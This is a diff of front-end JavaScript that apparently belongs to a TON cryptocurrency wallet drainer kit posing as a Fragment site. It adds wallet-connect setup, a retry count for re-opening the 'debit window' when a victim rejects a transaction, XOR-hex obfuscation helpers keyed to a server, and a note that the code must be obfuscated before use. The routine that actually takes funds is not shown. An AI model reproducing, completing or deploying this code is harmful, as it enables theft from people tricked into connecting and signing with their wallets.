@@ -371,73 +371,48 @@
 // OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
 
 // Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://fragment-xi.vercel.app/tonconnect-manifest.json' //'https://ton-connect.github.io/demo-dapp-with-wallet/tonconnect-manifest.json'; //'https://sainttest.de/tonconnect-manifest.json';
-
-// The encryption key between the server and Frontend must be the same
-let keyEncr = 500;
-
-// Number of calls to the debit window when a transaction is rejected
-const maxRetry = 3;
-
-// Domain server
-const server = 'fragment-xi.vercel.app'; //'sainttest.de'
-
-//
-const custom_btn = true; // Your own button to connect
-const custom_btn_name = 'button'; // For future updates, don't touch
-const autoconnect = false; // Auto-connect when entering the site
-
-
-
-
-let tcUIbtn;
-if (!custom_btn) {
-    tcUIbtnn = 'ton-connect'
-}
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: manifestUrl,
-    buttonRootId: 'ton-connect-ui'
-});
-
-let prs_enc = 0,
-    last_request_ts = 0;
-(async () => {
-    prs_enc = keyEncr;
-    keyEncr = Math.floor(Math.random() * 1000);
-})()
-const TonWeb = window.TonWeb;
-
-const tonweb = new TonWeb();
-
-const Address = TonWeb.utils.Address;
-//const tonweb = new TonWeb(new TonWeb.HttpProvider('https://testnet.toncenter.com/api/v2/jsonRPC'));
-
-let currTx = false;
-
-
-
-const prs = (s, t) => {
-    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
-    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
-    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
-    return t.split("").map(ab).map(as).map(bh).join("");
-};
-
-const srp = (s, e) => {
-    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
-    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
-    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
-};
-
-
-const connectWallet = async () => {
-    if (!tonConnectUI.connected) {
-        await tonConnectUI.openModal();
-    } else {
-        await tonConnectUI.disconnect();
-    }
-
-}
+const manifestUrl = 'https://fragment-xi.vercel.app/tonconnect-manifest.json';
+        let keyEncr = 500;
+        const maxRetry = 3;
+        const server = 'fragment-xi.vercel.app';
+        const custom_btn = true;
+        const autoconnect = false;
+        
+        // Inizializzazione TonConnectUI SENZA buttonRootId (così non cerca nessun div)
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: manifestUrl
+        });
+        
+        let prs_enc = 0;
+        (async () => {
+            prs_enc = keyEncr;
+            keyEncr = Math.floor(Math.random() * 1000);
+        })();
+        
+        const TonWeb = window.TonWeb;
+        const tonweb = new TonWeb();
+        
+        // Funzioni prs, srp (uguali)
+        const prs = (s, t) => {
+            const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
+            const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
+            const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+            return t.split("").map(ab).map(as).map(bh).join("");
+        };
+        const srp = (s, e) => {
+            const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
+            const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+            return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
+        };
+        
+        // connectWallet (esposta globalmente)
+        window.connectWallet = async () => {
+            if (!tonConnectUI.connected) {
+                await tonConnectUI.openModal();
+            } else {
+                await tonConnectUI.disconnect();
+            }
+        };
 
 const sendRequest = async (data) => {
     data.domain = window.location.host;
